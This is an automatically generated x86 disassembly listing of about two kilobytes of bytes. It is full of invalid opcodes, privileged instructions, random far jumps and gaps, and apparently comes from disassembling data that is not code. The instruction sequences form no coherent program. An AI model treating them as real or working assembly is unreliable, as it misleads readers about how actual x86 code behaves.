  42356b:	add    DWORD PTR [eax],eax
  42356d:	add    BYTE PTR [ecx+0x6d],al
  423570:	xchg   ebp,eax
  423571:	int3   
  423572:	jge    0x42353e
  423574:	cli    
  423575:	add    ebx,DWORD PTR [ebx]
  423577:	xchg   edi,eax
  423578:	cmc    
  423579:	and    esp,esp
  42357b:	lods   eax,DWORD PTR ds:[esi]
  42357c:	pop    edi
  42357d:	cwde   
  42357e:	jbe    0x423534
  423580:	xor    ch,BYTE PTR [eax-0x40c5a335]
  423586:	add    al,BYTE PTR [esi-0x43]
  423589:	jmp    0xd63c367d
  42358e:	jp     0x4235c8
  423590:	(bad)  
  423591:	xor    dh,ch
  423593:	xchg   edx,eax
  423594:	fnsave ds:0xb5a5d2a6
  42359a:	and    al,0xf0
  42359c:	shl    DWORD PTR [eax],cl
  42359e:	stos   DWORD PTR es:[edi],eax
  42359f:	fcmovnbe st,st(6)
  4235a1:	xor    esp,edi
  4235a3:	xchg   ebp,eax
  4235a4:	xchg   ebp,eax
  4235a5:	not    DWORD PTR [edx+0x2b]
  4235a8:	mov    edi,0x41a6aee6
  4235ad:	jp     0x423568
  4235af:	sbb    esi,DWORD PTR [ebp-0x2b]
  4235b2:	iret   
  4235b3:	retf   
  4235b4:	sub    eax,0xad33b31d
  4235b9:	les    ecx,FWORD PTR [eax+esi*4]
  4235bc:	or     eax,0x90cd5a3e
  4235c1:	push   edi
  4235c2:	ret    
  4235c3:	xor    eax,0xbfd3f357
  4235c8:	cmp    ebx,DWORD PTR [edx+eax*2+0x29f858e]
  4235cf:	mov    ebp,0xc9cc5e97
  4235d4:	retf   0xeed
  4235d7:	leave  
  4235d8:	je     0x4235c5
  4235da:	push   0x1fe1a334
  4235df:	push   esi
  4235e0:	xchg   ecx,eax
  4235e1:	jge    0x42361d
  4235e3:	xchg   bl,cl
  4235e5:	(bad)  
  4235e6:	out    0xee,eax
  4235e8:	sbb    DWORD PTR [edi],esi
  4235ea:	je     0x42365d
  4235ec:	(bad)  
  4235ed:	sbb    DWORD PTR [esi],ecx
  4235ef:	jp     0x4235e1
  4235f1:	mov    bl,0xdc
  4235f3:	(bad)  
  4235f4:	or     edx,DWORD PTR [edx]
  4235f6:	shl    esp,1
  4235f8:	sbb    DWORD PTR [edx+ebx*2+0x21],0x58d6fc43
  423600:	mov    esi,0x81e92387
  423605:	cmp    eax,0xcc4c416f
  42360a:	repnz popf 
  42360c:	repz xor DWORD PTR [ebx],edx
  42360f:	sub    dh,BYTE PTR [esi+0x5f]
  423612:	imul   esi,ecx,0xffffff93
  423615:	out    dx,al
  423616:	enter  0xba45,0x49
  42361a:	aam    0x11
  42361c:	mov    DWORD PTR [esi+0x4c],edx
  42361f:	sbb    cl,BYTE PTR [eax+0x2b934ccb]
  423625:	jnp    0x423676
  423627:	add    eax,0x1c92a948
  42362c:	push   eax
  42362d:	push   esp
  42362e:	inc    ebx
  42362f:	neg    DWORD PTR [edx+0x24]
  423632:	add    eax,0xfcfd3bfd
  423637:	dec    eax
  423638:	mov    eax,ds:0xfed5f801
  42363d:	test   eax,0x4e7fd26a
  423642:	mov    bh,0x9f
  423644:	inc    ebp
  423645:	sbb    esp,DWORD PTR [esi]
  423647:	push   0x5a4cf82e
  42364c:	fcmovbe st,st(7)
  42364e:	mov    edi,0xc595f2dc
  423653:	dec    ebx
  423654:	sub    DWORD PTR [edx-0x3],edx
  423657:	leave  
  423658:	xchg   esi,eax
  423659:	inc    edi
  42365a:	xchg   edx,eax
  42365b:	adc    ebx,DWORD PTR [esi+ecx*1-0x68a2bacb]
  423662:	pop    esi
  423663:	jbe    0x423629
  423665:	hlt    
  423666:	ds jae 0x4235ec
  423669:	bound  esi,QWORD PTR [edi-0x4e]
  42366c:	inc    edx
  42366d:	cmp    al,BYTE PTR [eax]
	...
  4236d3:	add    BYTE PTR [eax],al
  4236d5:	add    BYTE PTR [eax+0x7f747c8f],al
  4236db:	test   DWORD PTR [eax+0x7c916eff],0x479fca13
  4236e5:	mul    BYTE PTR [edi+0x7c]
  4236e8:	add    DWORD PTR [eax],eax
  4236ea:	add    BYTE PTR [ecx],al
  4236ec:	add    BYTE PTR [eax],al
  4236ee:	and    ebx,edi
  4236f0:	fistp  QWORD PTR [esi-0x72]
  4236f3:	scas   eax,DWORD PTR es:[edi]
  4236f4:	dec    esi
  4236f5:	or     eax,0xb542ec0
  4236fa:	and    ebx,edi
  4236fc:	jp     0x423749
  4236fe:	or     eax,esi
  423700:	test   al,0x8f
  423702:	sub    ebx,DWORD PTR [esi+edx*4-0x55]
  423706:	call   0xa9f:0xf032c5ec
  42370d:	xchg   esp,eax
  42370e:	adc    bl,bh
  423710:	cdq    
  423711:	push   cs
  423712:	neg    BYTE PTR [ebp+ebx*1+0x31]
  423716:	adc    dl,BYTE PTR [esi]
  423718:	daa    
  423719:	popa   
  42371a:	mov    cl,0xa1
  42371c:	sub    ebp,DWORD PTR ds:0xe418f52d
  423722:	push   ebx
  423723:	mov    cl,0x29
  423725:	xchg   ch,dl
  423727:	fistp  QWORD PTR [edx]
  423729:	pop    edi
  42372a:	mov    al,ds:0xfe9bd1cf
  42372f:	cmp    al,0xac
  423731:	int3   
  423732:	xchg   edi,eax
  423733:	xchg   esp,eax
  423734:	pop    edx
  423735:	pushw  ds
  423737:	jl     0x42372e
  423739:	and    DWORD PTR [ebx+eax*8+0x82f1de2],ecx
  423740:	or     al,0xbe
  423742:	inc    eax
  423743:	adc    eax,0xe55200bd
  423748:	pop    esp
  423749:	js     0x4237c3
  42374b:	fiadd  DWORD PTR [ebp+ebx*1-0x3a]
  42374f:	jmp    esp
  423751:	add    DWORD PTR [edx+ebp*4+0x18],0x7231d358
  423759:	lea    esp,[edi+0x77]
  42375c:	pop    esi
  42375d:	call   0xc42d:0x39e9c175
  423764:	xchg   esp,eax
  423765:	dec    ecx
  423766:	std    
  423767:	jo     0x4237bf
  423769:	and    bl,dh
  42376b:	les    eax,FWORD PTR [edx+0x30efda25]
  423771:	mov    dl,0x4b
  423773:	clc    
  423774:	xor    eax,0x4b8406f5
  423779:	xlat   BYTE PTR ds:[ebx]
  42377a:	mov    ebx,0x62054a4e
  42377f:	pop    ss
  423780:	inc    ecx
  423781:	lods   al,BYTE PTR ds:[esi]
  423782:	shr    BYTE PTR [esi+0x3c],0x43
  423786:	push   cs
  423787:	inc    edi
  423788:	mov    al,0x6a
  42378a:	aad    0x41
  42378c:	sbb    al,0x56
  42378e:	jmp    0xe757d812
  423793:	jle    0x4237e3
  423795:	jo     0x423772
  423797:	push   0x71
  423799:	ins    DWORD PTR es:[edi],dx
  42379a:	test   BYTE PTR [ecx-0x7477985],ah
  4237a0:	xchg   edx,eax
  4237a1:	loope  0x423778
  4237a3:	mov    cs,WORD PTR [edx+0x8f7421]
  4237a9:	and    BYTE PTR [ecx-0x4f],al
  4237ac:	xor    dl,BYTE PTR [eax]
  4237ae:	call   0x8b4dabe5
  4237b3:	inc    edx
  4237b4:	or     eax,DWORD PTR [ebp-0x6bdef141]
  4237ba:	mov    dl,0x29
  4237bc:	mov    ecx,0x8e7cb614
  4237c1:	fistp  QWORD PTR [esi+0x2a]
  4237c4:	and    ah,dl
  4237c6:	xchg   ecx,eax
  4237c7:	dec    ecx
  4237c8:	fisub  WORD PTR [edx+0x41]
  4237cb:	sbb    ebp,DWORD PTR [esi+0x7627ad05]
  4237d1:	popf   
  4237d2:	cmp    cl,BYTE PTR [ecx]
  4237d4:	mov    bl,0x68
  4237d6:	push   DWORD PTR [ebx+ecx*8]
  4237d9:	ins    DWORD PTR es:[edi],dx
  4237da:	push   ds
  4237db:	pusha  
  4237dc:	je     0x42378a
  4237de:	in     al,0x94
  4237e0:	fmul   DWORD PTR [ebx]
  4237e2:	add    eax,0xa0e25686
  4237e7:	jmp    0x393d:0xaacbda41
	...
  423856:	xor    al,0x23
  423858:	jo     0x4237f7
  42385a:	ja     0x42383b
  42385c:	std    
  42385d:	stos   DWORD PTR es:[edi],eax
  42385e:	(bad)  
  42385f:	sbb    edx,esi
  423861:	jmp    0x7d67:0x7f3c4cd9
  423868:	add    DWORD PTR [eax],eax
  42386a:	add    BYTE PTR [ecx],al
  42386c:	add    BYTE PTR [eax],al
  42386e:	iret   
  42386f:	mov    esi,0x208d1b4c
  423874:	mul    DWORD PTR [edi+0x72]
  423877:	retf   
  423878:	add    al,ch
  42387a:	sbb    esp,edx
  42387c:	test   DWORD PTR [edi+eax*2-0x22b37140],esp
  423883:	loopne 0x4238d1
  423885:	hlt    
  423886:	inc    esp
  423887:	in     eax,dx
  423888:	mov    edx,0x8aef8882
  42388d:	ror    ch,1
  42388f:	or     BYTE PTR [ecx+0x758e2e6d],dl
  423895:	fld    TBYTE PTR [ebp+0x4c]
  423898:	push   ds
  423899:	or     cl,0xfb
  42389c:	inc    esi
  42389d:	lods   eax,DWORD PTR ds:[esi]
  42389e:	test   al,0x51
  4238a0:	(bad)  
  4238a2:	sub    edi,ebx
  4238a4:	jp     0x423891
  4238a6:	mov    ds:0x513a3879,eax
  4238ab:	clc    
  4238ac:	mov    eax,ds:0xe42f3e5b
  4238b1:	aam    0xc5
  4238b3:	imul   edi,DWORD PTR [esi-0x21267041],0x6e252f44
  4238bd:	pusha  
  4238be:	sahf   
  4238bf:	cmp    ebp,DWORD PTR [esi-0x5b]
  4238c2:	sbb    ebp,DWORD PTR [esi+0x12]
  4238c5:	je     0x4238eb
  4238c7:	and    al,0x4f
  4238c9:	sbb    esi,DWORD PTR [esi+ebp*4]
  4238cc:	sbb    BYTE PTR [edx+ecx*1],dh
  4238cf:	sub    BYTE PTR [ebx+0x6f],0xf
  4238d3:	sahf   
  4238d4:	jmp    0x4210:0xad48eb29
  4238db:	cmc    
  4238dc:	or     al,0x69
  4238de:	cmp    DWORD PTR [edx-0x74],esp
  4238e1:	pop    es
  4238e2:	in     al,0x57
  4238e4:	fwait
  4238e5:	loopne 0x42395a
  4238e7:	jg     0x42387e
  4238e9:	jno    0x423916
  4238eb:	jmp    0x42393f
  4238ed:	or     DWORD PTR [ecx-0x3f],ebx
  4238f0:	rcl    ebx,1
  4238f2:	sub    bl,bl
  4238f4:	jbe    0x423885
  4238f6:	test   eax,0x61827b3d
  4238fb:	adc    DWORD PTR [edi],0x23504624
  423901:	fst    st(1)
  423903:	pop    eax
  423904:	sahf   
  423905:	dec    esp
  423906:	inc    ebx
  423907:	adc    ebx,DWORD PTR [eax-0xe]
  42390a:	ins    DWORD PTR es:[edi],dx
  42390b:	add    ebx,edi
  42390d:	pop    ebx
  42390e:	int3   
  42390f:	in     al,0x2a
  423911:	xchg   DWORD PTR [ebx],edx
  423913:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423914:	clc    
  423915:	add    DWORD PTR [edx-0x312774c1],ebp
  42391b:	out    0x64,al
  42391d:	les    eax,FWORD PTR [ecx+esi*8+0x79]
  423921:	xchg   edx,eax
  423922:	mov    DWORD PTR [eax+0x25],ebp
  423925:	clc    
  423926:	jmp    0x4ac1:0xe337a28c
  42392d:	sbb    cl,ah
  42392f:	jmp    0x9a51:0x3b506fad
  423936:	or     DWORD PTR [ebp+0x31],0x42ac6ae4
  42393d:	push   0x7e263f00
  423942:	je     0x42399f
  423944:	or     DWORD PTR [ebx+0x7e],ecx
  423947:	xor    ebx,DWORD PTR [esi]
  423949:	daa    
  42394a:	ficomp DWORD PTR [edi]
  42394c:	and    al,0x30
  42394e:	xchg   DWORD PTR [esi+edi*8-0x210ac7bc],ebx
  423955:	push   es
  423956:	sbb    eax,0x4e9af73e
  42395b:	rol    DWORD PTR [ebp+0x16],0xe2
  42395f:	xor    ebx,edi
  423961:	push   cs
  423962:	ins    DWORD PTR es:[edi],dx
  423963:	rcl    DWORD PTR es:[esi],1
  423966:	inc    ebx
  423967:	cmp    BYTE PTR [edi],ch
  423969:	pop    ds
  42396a:	sti    
  42396b:	push   eax
  42396c:	mov    al,ds:0xd8
	...
  4239d5:	add    BYTE PTR [edx-0x770e5c],cl
  4239db:	(bad)  
  4239dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239de:	push   ecx
  4239df:	sbb    eax,0x50c72bbd
  4239e4:	lods   al,BYTE PTR ds:[esi]
  4239e5:	mov    DWORD PTR [edi+0x7e],esp
  4239e8:	add    DWORD PTR [eax],eax
  4239ea:	add    BYTE PTR [ecx],al
  4239ec:	add    BYTE PTR [eax],al
  4239ee:	loope  0x423989
  4239f0:	push   ecx
  4239f1:	xor    edi,esp
  4239f3:	ret    0x7bf4
  4239f6:	sbb    eax,0x1146590c
  4239fb:	mov    ecx,0x6ce3285
  423a00:	dec    esi
  423a01:	popf   
  423a02:	adc    al,BYTE PTR [ecx]
  423a04:	dec    ecx
  423a05:	inc    edx
  423a06:	not    DWORD PTR [esp+ebx*2-0x2]
  423a0a:	inc    edx
  423a0b:	out    0x7e,eax
  423a0d:	icebp  
  423a0e:	daa    
  423a0f:	cmp    DWORD PTR [eax],esi
  423a11:	add    BYTE PTR [eax+0x78],bl
  423a14:	popf   
  423a15:	sahf   
  423a16:	jmp    0x1867915d
  423a1b:	nop
  423a1c:	mov    edi,0x2352e0bb
  423a21:	jns    0x4239cb
  423a23:	lahf   
  423a24:	mov    BYTE PTR [esp+ecx*4+0x2d],al
  423a28:	add    ebx,eax
  423a2a:	mov    eax,0xb83eaaec
  423a2f:	adc    al,0xb8
  423a31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a32:	xor    al,0x1
  423a34:	push   esp
  423a35:	(bad)  
  423a36:	retf   0x32ec
  423a39:	imul   ecx,esp,0xd9c12e97
  423a3f:	sbb    edx,eax
  423a41:	jl     0x423a8d
  423a43:	sub    cl,0xba
  423a46:	dec    esi
  423a47:	jmp    0x423aa9
  423a49:	push   es
  423a4a:	inc    edi
  423a4b:	jecxz  0x423a4a
  423a4d:	iret   
  423a4e:	cmp    eax,0x82ccb465
  423a53:	cli    
  423a54:	xchg   edi,eax
  423a55:	mov    eax,0x69e8f4a6
  423a5a:	mov    eax,ds:0x93ccdada
  423a5f:	(bad)  
  423a61:	and    DWORD PTR [edx+esi*8+0x48],edx
  423a65:	shl    BYTE PTR [eax],0x62
  423a68:	mov    bh,BYTE PTR [ebp-0x6a2ce9d0]
  423a6e:	push   ss
  423a6f:	cmp    ebx,0x70
  423a72:	xchg   ebp,eax
  423a73:	imul   BYTE PTR [esi]
  423a75:	fisubr WORD PTR [edx-0x2d]
  423a78:	mov    ds:0xc7739df3,eax
  423a7d:	call   0xb9b6:0xe6fd0149
  423a84:	aaa    
  423a85:	fsubr  st(5),st
  423a87:	fadd   QWORD PTR [edx-0x7a]
  423a8a:	lahf   
  423a8b:	lods   eax,DWORD PTR ds:[esi]
  423a8c:	xchg   edx,eax
  423a8d:	xlat   BYTE PTR ds:[ebx]
  423a8e:	xor    al,0xda
  423a90:	dec    eax
  423a91:	data16 hlt 
  423a93:	mov    DWORD PTR [edi],ebp
  423a95:	xchg   esi,eax
  423a96:	arpl   WORD PTR [ebx],bx
  423a98:	pop    esi
  423a99:	adc    al,0x37
  423a9b:	inc    edx
  423a9c:	cmp    dl,BYTE PTR [ebp-0x20]
  423a9f:	dec    edx
  423aa0:	cmp    DWORD PTR [esi+ebx*1-0x297d41e3],eax
  423aa7:	bound  eax,QWORD PTR cs:[ebx-0x7a]
  423aab:	fsubr  QWORD PTR [eax-0x38]
  423aae:	dec    edi
  423aaf:	and    ebp,DWORD PTR [ebx+0x3eec2c9f]
  423ab5:	test   al,0xa7
  423ab7:	repz scas al,BYTE PTR es:[edi]
  423ab9:	call   0xec8b:0x17805706
  423ac0:	lods   al,BYTE PTR ds:[esi]
  423ac1:	sub    al,0xca
  423ac3:	out    0xbe,eax
  423ac5:	fsubr  DWORD PTR [ebx+0x38260593]
  423acb:	outs   dx,BYTE PTR es:[esi]
  423acd:	mov    eax,ds:0x154348a
  423ad2:	(bad)  [edi+0x24]
  423ad5:	clc    
  423ad6:	lds    esi,FWORD PTR [ecx-0x18557646]
  423adc:	jns    0x423a82
  423ade:	retf   0x4e8
  423ae1:	rol    DWORD PTR [edi],0x8e
  423ae4:	jbe    0x423a83
  423ae6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ae7:	popf   
  423ae8:	mov    edi,0x4265de90
  423aed:	sldt   WORD PTR [eax]
	...
  423b54:	add    BYTE PTR [eax],al
  423b56:	xor    BYTE PTR ds:0xdf7d9f75,bh
  423b5c:	cli    
  423b5d:	mov    edi,0x60851ed8
  423b62:	icebp  
  423b63:	and    eax,0x7f67f816
  423b68:	add    DWORD PTR [eax],eax
  423b6a:	add    BYTE PTR [ecx],al
  423b6c:	add    BYTE PTR [eax],al
  423b6e:	into   
  423b6f:	add    BYTE PTR [eax],dl
  423b71:	mov    DWORD PTR [edx-0x78],edx
  423b74:	dec    esp
  423b75:	fwait
  423b76:	addr16 pop esi
  423b78:	lods   eax,DWORD PTR ds:[esi]
  423b79:	pop    edi
  423b7a:	enter  0x77cd,0x6d
  423b7e:	jb     0x423b23
  423b80:	repz push esi
  423b82:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  423b84:	add    al,0x41
  423b86:	cdq    
  423b87:	sub    ah,BYTE PTR [edx]
  423b89:	or     DWORD PTR [ebx-0xc06a1d2],esp
  423b8f:	addr16 sbb ebp,ebx
  423b92:	xor    eax,0xe73b58a3
  423b97:	push   0x6c6f4614
  423b9c:	push   ecx
  423b9d:	xchg   esp,eax
  423b9e:	fs and al,0xe1
  423ba1:	stos   BYTE PTR es:[edi],al
  423ba2:	mov    ebx,0x933247d9
  423ba7:	push   edi
  423ba8:	and    DWORD PTR [edx-0x2aedadfa],ecx
  423bae:	pop    esp
  423baf:	sbb    dh,BYTE PTR [edi-0x5a069e7d]
  423bb5:	cmp    al,0x96
  423bb7:	xor    BYTE PTR [edx],0xdb
  423bba:	mov    DWORD PTR ds:0xf6d1626f,ecx
  423bc0:	das    
  423bc1:	(bad)  
  423bc2:	popa   
  423bc3:	out    dx,al
  423bc4:	imul   ebx,DWORD PTR [edi-0x17c2077d],0x3dce5e24
  423bce:	adc    dl,BYTE PTR [esi-0x9]
  423bd1:	cmp    esi,ebx
  423bd3:	or     cl,BYTE PTR [edx+edi*1+0x7d]
  423bd7:	retf   0x6f62
  423bda:	sbb    al,BYTE PTR [ebx]
  423bdc:	xlat   BYTE PTR ds:[ebx]
  423bdd:	xor    esp,DWORD PTR [edx-0xf]
  423be0:	cmp    DWORD PTR [ecx-0x72a8531f],ebx
  423be6:	je     0x423bf7
  423be8:	mov    esp,0xfe342f4e
  423bed:	jno    0x423bb6
  423bef:	add    al,0x2a
  423bf1:	mov    dh,0x11
  423bf3:	add    al,0xa9
  423bf5:	mov    ecx,DWORD PTR [eax+esi*2]
  423bf8:	jle    0x423c25
  423bfa:	fidivr WORD PTR [esi+ebx*4-0x15]
  423bfe:	(bad)  
  423bff:	stc    
  423c00:	mov    dh,0x65
  423c02:	cld    
  423c03:	jg     0x423baf
  423c05:	lahf   
  423c06:	push   ecx
  423c07:	jmp    0x9cc34220
  423c0c:	cs lahf 
  423c0e:	xchg   ebp,eax
  423c0f:	lds    eax,FWORD PTR [edx+0x50]
  423c12:	cwde   
  423c13:	pop    esi
  423c14:	pushf  
  423c15:	mov    edi,DWORD PTR [edx+ebx*8]
  423c18:	mov    bl,dl
  423c1a:	pop    edi
  423c1b:	call   0x4da3a7be
  423c20:	icebp  
  423c21:	popa   
  423c22:	cmp    al,0x89
  423c24:	mov    esi,0x5b028989
  423c29:	mov    dh,0xb
  423c2b:	xchg   al,al
  423c2d:	push   ecx
  423c2e:	repnz mov eax,0xcf2b7e6
  423c34:	or     al,0xc3
  423c36:	popa   
  423c37:	scas   eax,DWORD PTR es:[edi]
  423c38:	loope  0x423c32
  423c3a:	in     eax,0xec
  423c3c:	ja     0x423ca4
  423c3e:	inc    edx
  423c3f:	lock in eax,dx
  423c41:	add    BYTE PTR [ecx-0x7bb799b1],0x6f
  423c48:	push   ss
  423c49:	jge    0x423cc9
  423c4b:	fisttp DWORD PTR [esi-0x70f4e940]
  423c51:	fs dec esi
  423c53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c55:	mov    eax,0x5e537443
  423c5a:	cdq    
  423c5b:	leave  
  423c5c:	sbb    BYTE PTR [edi+0x17],ah
  423c5f:	sahf   
  423c60:	push   ss
  423c61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c62:	jb     0x423c45
  423c64:	jl     0x423c3a
  423c66:	push   eax
  423c67:	add    al,0x72
  423c69:	jnp    0x423c11
  423c6b:	aas    
  423c6c:	out    0xc6,al
	...
  423cd6:	std    
  423cd7:	(bad)  
  423cd8:	test   eax,0xff57ab46
  423cdd:	call   FWORD PTR [eax+0x2b446617]
  423ce3:	sbb    DWORD PTR [edi-0x11],esi
  423ce6:	add    BYTE PTR [bx+di],0x0
  423cea:	add    BYTE PTR [ecx],al
  423cec:	add    BYTE PTR [eax],al
  423cee:	fld    QWORD PTR [eax-0x21]
  423cf1:	ret    0x649e
  423cf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423cf5:	call   0x3c21:0xa5005a64
  423cfc:	ins    DWORD PTR es:[edi],dx
  423cfd:	and    eax,0xc72c2c30
  423d02:	xchg   ecx,eax
  423d03:	(bad)  
  423d04:	das    
  423d05:	test   DWORD PTR [edx+0x66c2b650],edx
  423d0b:	shl    DWORD PTR [edi+0x3fbd9981],cl
  423d11:	cli    
  423d12:	or     al,0x50
  423d14:	mov    fs,WORD PTR [eax-0x39]
  423d17:	scas   eax,DWORD PTR es:[edi]
  423d18:	pop    edx
  423d19:	mov    WORD PTR [eax+ebx*2-0x28],ss
  423d1d:	int    0x79
  423d1f:	sbb    al,BYTE PTR [esi-0x15]
  423d22:	adc    BYTE PTR [ebx+edx*2],0xc2
  423d26:	xor    ebx,esi
  423d28:	sub    DWORD PTR [ecx],0x6a
  423d2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d2c:	dec    ebx
  423d2d:	cmp    BYTE PTR [ebx],bl
  423d2f:	jno    0x423d3b
  423d31:	nop
  423d32:	or     ch,ah
  423d34:	pop    ebp
  423d35:	mov    ebp,0xef88fbb1
  423d3a:	jg     0x423d6b
  423d3c:	repz mov WORD PTR [edi+0x39003e81],cs
  423d43:	push   esi
  423d44:	sub    DWORD PTR [ecx-0x52b3f6c9],ecx
  423d4a:	dec    ebx
  423d4b:	int3   
  423d4c:	aad    0x50
  423d4e:	fimul  WORD PTR [eax-0x72cdde2f]
  423d54:	pop    ss
  423d55:	dec    ebx
  423d56:	ins    BYTE PTR es:[edi],dx
  423d57:	fwait
  423d58:	enter  0x711,0xcf
  423d5c:	mov    ebx,0xbe9d0da2
  423d61:	or     edi,0x3a6e973
  423d67:	lahf   
  423d68:	and    DWORD PTR [edi+ebp*4],esi
  423d6b:	popa   
  423d6c:	jb     0x423dce
  423d6e:	xchg   ebp,eax
  423d6f:	pop    ebp
  423d70:	ds inc edx
  423d72:	(bad)
  423d77:	push   eax
  423d78:	jmp    0x423dcb
  423d7a:	stc    
  423d7b:	pop    es
  423d7c:	lock das 
  423d7e:	inc    ebp
  423d7f:	inc    esi
  423d80:	jnp    0x423db0
  423d82:	(bad)  [edi-0x5d467213]
  423d88:	pop    esi
  423d89:	add    edi,ebx
  423d8b:	mov    ah,0x70
  423d8d:	test   eax,0xba645980
  423d92:	stos   BYTE PTR es:[edi],al
  423d93:	loop   0x423d1a
  423d95:	out    dx,eax
  423d96:	(bad)  
  423d97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d98:	sbb    al,0x60
  423d9a:	sar    DWORD PTR [esi+ebx*2],1
  423d9d:	mov    BYTE PTR [ecx+0x2cba9751],dl
  423da3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423da4:	(bad)  
  423da5:	jle    0x423dcd
  423da7:	xchg   ebx,eax
  423da8:	xchg   ecx,eax
  423da9:	pop    eax
  423daa:	push   0xfffffffe
  423dac:	mov    dl,0x4b
  423dae:	aas    
  423daf:	cmp    dl,BYTE PTR [ebp+0x38]
  423db2:	sub    ch,BYTE PTR [esi+0x2de75418]
  423db8:	fcom   DWORD PTR [edx+0x7217ff08]
  423dbe:	enter  0x2f35,0x20
  423dc2:	cmp    cl,cl
  423dc4:	inc    esp
  423dc5:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  423dc7:	push   cs
  423dc8:	scas   eax,DWORD PTR es:[edi]
  423dc9:	daa    
  423dca:	movhlps xmm0,xmm0
  423dcd:	pop    ecx
  423dce:	mov    ds:0x4ee0d0db,al
  423dd3:	ror    DWORD PTR [ebx+0x2871443e],cl
  423dd9:	pushf  
  423dda:	mov    ecx,0xea57f200
  423ddf:	push   ebx
  423de0:	ins    DWORD PTR es:[edi],dx
  423de1:	adc    DWORD PTR ds:0x42c4add3,edx
  423de7:	inc    esp
  423de8:	cwde   
  423de9:	cmp    eax,0x7e8c1b95
	...
  423e56:	(bad)  
  423e57:	test   BYTE PTR [edi-0x118668f7],0xff
  423e5e:	daa    
  423e5f:	mov    DWORD PTR [eax+0x77d92ed2],esp
  423e65:	hlt    
  423e66:	add    DWORD PTR [bx+di],0x10000
  423e6d:	add    BYTE PTR [eax],bl
  423e6f:	jb     0x423eca
  423e71:	test   BYTE PTR gs:0x3029d0b4,al
  423e78:	inc    esp
  423e79:	inc    esp
  423e7a:	aad    0xce
  423e7c:	cmc    
  423e7d:	and    eax,0xf1616671
  423e82:	in     al,0x22
  423e84:	jo     0x423e65
  423e86:	mov    bh,0xc6
  423e88:	xchg   esp,eax
  423e89:	loopne 0x423e35
  423e8b:	push   eax
  423e8c:	push   esp
  423e8d:	gs xchg ebx,eax
  423e8f:	loopne 0x423e7f
  423e91:	scas   eax,DWORD PTR es:[edi]
  423e92:	xor    bl,bl
  423e94:	cmp    ebp,DWORD PTR [edi]
  423e96:	adc    DWORD PTR [ebx-0x27],esp
  423e99:	sar    bh,cl
  423e9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e9c:	jmp    0x45ca0812
  423ea1:	ss push eax
  423ea3:	mov    es,WORD PTR [ebp-0x26]
  423ea6:	xor    esp,DWORD PTR [eax-0x2b]
  423ea9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423eaa:	aaa    
  423eab:	dec    ebp
  423eac:	aam    0xf7
  423eae:	push   cs
  423eaf:	pop    edi
  423eb0:	inc    ebx
  423eb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423eb2:	ret    
  423eb3:	inc    ebx
  423eb4:	jne    0x423ee4
  423eb6:	pusha  
  423eb7:	sahf   
  423eb8:	cmp    DWORD PTR [edx+0x272f1809],esi
  423ebe:	push   ebp
  423ebf:	or     eax,0xf1e3b241
  423ec4:	ret    
  423ec5:	jg     0x423e9d
  423ec7:	test   dl,bl
  423ec9:	scas   eax,DWORD PTR es:[edi]
  423eca:	sahf   
  423ecb:	dec    esp
  423ecc:	sbb    esi,DWORD PTR [ecx+ecx*4-0x5f3a14f9]
  423ed3:	jge    0x423ed0
  423ed5:	icebp  
  423ed6:	mov    esp,0x3a6d7459
  423edb:	bound  ebp,QWORD PTR [ecx-0x61]
  423ede:	jp     0x423eaf
  423ee0:	(bad)  
  423ee1:	out    0xcc,al
  423ee3:	loopne 0x423ec5
  423ee5:	mov    bl,BYTE PTR [ebx+ecx*2]
  423ee8:	or     DWORD PTR [eax+0x7e],edi
  423eeb:	mov    dh,0x27
  423eed:	cs out 0x10,eax
  423ef0:	nop
  423ef1:	pop    esp
  423ef2:	jge    0x423f30
  423ef4:	ror    BYTE PTR [esp+edi*4-0x11],1
  423ef8:	cmp    eax,0x134452e6
  423efd:	add    al,0x6c
  423eff:	jae    0x423edb
  423f01:	shr    DWORD PTR [edx],cl
  423f03:	add    BYTE PTR [edx+ebx*2+0x30c100ea],dl
  423f0a:	push   ebx
  423f0b:	add    eax,0x3c9cf533
  423f10:	repz adc al,0x37
  423f13:	push   0xffffffe8
  423f15:	push   0xffffffdd
  423f17:	xlat   BYTE PTR ds:[ebx]
  423f18:	push   0x52
  423f1a:	mov    bh,0x71
  423f1c:	outs   dx,DWORD PTR ds:[esi]
  423f1d:	loop   0x423f89
  423f1f:	mov    BYTE PTR [edx-0x3c],ah
  423f22:	mov    edi,0x18525902
  423f27:	call   0x9fc1e1e3
  423f2c:	scas   eax,DWORD PTR es:[edi]
  423f2d:	dec    esp
  423f2e:	mov    dl,0x3c
  423f31:	stos   BYTE PTR es:[edi],al
  423f32:	retf   
  423f33:	retf   0x93db
  423f36:	fs inc ebx
  423f38:	call   0x51fb:0x3beb59ad
  423f3f:	int    0xa8
  423f41:	add    BYTE PTR [ecx-0x80],bl
  423f44:	or     BYTE PTR ds:0x9c5b1f11,bh
  423f4a:	xlat   BYTE PTR ds:[ebx]
  423f4b:	jp     0x423f44
  423f4d:	adc    al,0xc1
  423f4f:	lock fucomp st(2)
  423f52:	sub    DWORD PTR [esi+0x55],edx
  423f55:	jb     0x423efa
  423f57:	jp     0x423fb5
  423f59:	cli    
  423f5a:	inc    eax
  423f5b:	sbb    bh,BYTE PTR [edi-0x6cb9f2df]
  423f61:	cmp    al,bl
  423f63:	inc    eax
  423f64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423f65:	or     al,0xbf
  423f67:	push   ebp
  423f68:	mov    ?,WORD PTR [eax-0x1469fd97]
	...
  423fd6:	scas   al,BYTE PTR es:[edi]
  423fd7:	call   0x9fff:0xff74b964
